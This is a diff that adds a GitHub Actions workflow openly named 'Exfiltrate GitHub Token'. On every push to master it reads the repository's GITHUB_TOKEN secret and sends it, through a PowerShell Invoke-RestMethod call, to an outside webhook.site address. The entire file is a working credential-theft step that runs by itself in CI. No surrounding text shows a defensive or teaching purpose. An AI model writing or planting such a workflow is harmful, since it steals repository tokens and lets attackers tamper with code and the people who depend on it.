@@ -1,0 +1,21 @@
+name: Exfiltrate GitHub Token
+
+on:
+  push:
+    branches: [ "master" ]
+
+jobs:
+  build:
+    runs-on: windows-latest
+
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v3
+
+      - name: Exfiltrate GITHUB_TOKEN
+        env:
+          TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          powershell -Command "
+            Invoke-RestMethod -Uri 'https://webhook.site/abcccc..' -Headers @{ Authorization = 'token ' + $env:TOKEN }
+          "
